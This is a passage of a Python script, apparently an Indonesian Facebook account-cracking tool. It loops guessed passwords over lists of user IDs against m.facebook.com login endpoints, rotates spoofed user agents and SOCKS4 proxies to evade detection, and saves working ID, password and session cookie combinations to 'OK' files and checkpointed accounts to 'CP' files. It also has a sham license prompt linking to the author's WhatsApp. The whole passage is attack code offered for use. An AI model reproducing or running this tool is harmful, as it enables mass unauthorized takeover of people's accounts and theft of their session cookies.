'sec-ch-ua-platform': '"Android"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': ua,
'viewport-width': f'{str(rr(300,999))}',
'x-asbd-id': '129477',
'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'x-requested-with': 'XMLHttpRequest',
'x-response-format': 'JSONStream',
}
			params = {
'refsrc': 'deprecated',
'lwv': '100',
}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=140235673279940&auth_token=ad2a811231a8875e972d3b31c3cf6735&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fapp_id%3D140235673279940%26auth_type%26cbt%3D1704088960393%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2b1bb72145b1f%2526domain%253Dmy.freenom.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmy.freenom.com%25252Ff3d9804737545e%2526relation%253Dopener%26client_id%3D140235673279940%26config_id%26display%3Dtouch%26domain%3Dmy.freenom.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmy.freenom.com%252Fclientarea.php%26force_confirmation%3Dfalse%26id%3Df379798f8b6896%26locale%3Den_US%26logger_id%3Db4cc7aa7-274b-4da7-8c07-d2550065a43a%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df345bdf985ded9%2526domain%253Dmy.freenom.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmy.freenom.com%25252Ff3d9804737545e%2526relation%253Dopener.parent%2526frame%253Df379798f8b6896%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv12.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=140235673279940&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df345bdf985ded9%26domain%3Dmy.freenom.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fmy.freenom.com%252Ff3d9804737545e%26relation%3Dopener.parent%26frame%3Df379798f8b6896%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',params=params,headers=headers,data=data,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}[-OK] {H}Email  ☛{H}{uid}')
				print(f'\r{P}[-OK] {H}Pasw  ☛{H}{pw}')
				print(f'\r{P}[-OK] {H}Cokis  ☛{U}{kuki}')
				open('OK/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				cp+=1
				print(f'\r{P}TYPO Z {K}{uid}|{pw}')
				open('CP/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1




#---------------------[ METODE-TOUCH-3 ]---------------------#
def metod2(idf,pwv):
	global loop,ok,cp
	ua = random.choice(ugen)
	ses = requests.Session()
	sys.stdout.write(f"\r{x}[TYPO Z] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECP-{cp}")
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1096408964130955&kid_directed_site=0&app_id=1096408964130955&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D1096408964130955%26state%3D817e5400986e72e6ea87eeae01cd218b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.1.4%26redirect_uri%3Dhttps%253A%252F%252Fcutt.ly%252Flogin%252Ffb-login%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98ba1bac-db96-4144-b063-1635213c7a4d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fcutt.ly%2Flogin%2Ffb-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D817e5400986e72e6ea87eeae01cd218b%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empity','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1096408964130955&kid_directed_site=0&app_id=1096408964130955&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D1096408964130955%26state%3D817e5400986e72e6ea87eeae01cd218b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.1.4%26redirect_uri%3Dhttps%253A%252F%252Fcutt.ly%252Flogin%252Ffb-login%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98ba1bac-db96-4144-b063-1635213c7a4d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fcutt.ly%2Flogin%2Ffb-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D817e5400986e72e6ea87eeae01cd218b%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1096408964130955&auth_token=46c61636e7c46590956dbdf2060b3ea3&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D1096408964130955%26state%3D817e5400986e72e6ea87eeae01cd218b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.1.4%26redirect_uri%3Dhttps%253A%252F%252Fcutt.ly%252Flogin%252Ffb-login%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98ba1bac-db96-4144-b063-1635213c7a4d%26tp%3Dunspecified&refsrc=deprecated&app_id=1096408964130955&cancel=https%3A%2F%2Fcutt.ly%2Flogin%2Ffb-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D817e5400986e72e6ea87eeae01cd218b%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f'\r{P}[{K}CP{P}] : {U}{idf}|{pw}{H}{kuki}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r{P}[{H}OK{P}] : {H}{idf}|{pw}\n{H}{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


for i in range(10):
	a = "Asep"
	b = "Udin"
	c = "Puki"
	d = "Pantek"
	user=(f'{a}{b}{c}{d}')
for t in range(10):
	a = "aww"
	b = "woi"
	c = "wibu"
	d = "bau bawang"
	pwas=(f'{a}{b}{c}{d}')
def ngewe():
    try:
        open("lisensimu.txt", "r").read()
    except FileNotFoundError:
        os.system("clear")
        banner()
        prints(nel(f'              {P2}Login Api Key Lisensi{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
        print(' [%s1%s] Login Ke Tools'%(H,N))
        print(' [%s2%s] Hubungi Admin'%(H,N))
        pil = input(' %s[%s?%s] Choice : '%(N,K,N))
        if pil =="":
            jalan(f" {N}[{M}×{N}] Sorry, it is wrong...!");time.sleep(1);ngewe()
        elif pil in["2","02"]:
            jalan("\n %s[%s•%s] %sYou will be redirected to the Author Whatsapp..."%(N,H,N,H));time.sleep(0.02)
            os.system('xdg-open https://wa.me/6282290885204?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);ngewe()
        elif pil in["1","01"]:
            prints(nel(f'             {P2}Masukan Username Anda{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
        else:
            exit(f"{N}[{M}×{N}] Sorry, it is wrong...!")
        pw = input(f"{P}[{M}?{P}] Enter Username : {H}")
        if pw in user:
            jalan(f"{P}[{H}✓{P}]{H} Username Anda Berhasil Didaftarkan");time.sleep(1);kska()
        else:
            jalan(f"\n{P}[{M}!{P}]{M} Maaf Username Tidak Terdaftar");time.sleep(1);ngewe()
    login()
def kska():
    xx = input(f"{P}[{M}?{P}] Api Key : {H}")
    loading()
    if xx in[""]:
        jalan(f"{P}[{M}X{P}]{M} Sorry don't be blank!");time.sleep(1);ngewe()
    elif xx in pwas:
        jalan(f"\n{P}[{H}✓{P}]  Selamat Apikey Anda Berhasil Didaftarkan");time.sleep(3);open("lisensimu.txt", "a").write(xx);login();cuak()
    else:
        print(f"\n{P}[{M}!{P}] Api Key Anda Belum Terdaftar");time.sleep(1);ngewe()
        
        
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	
	try:os.mkdir('/sdcard/downloads/DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	tam()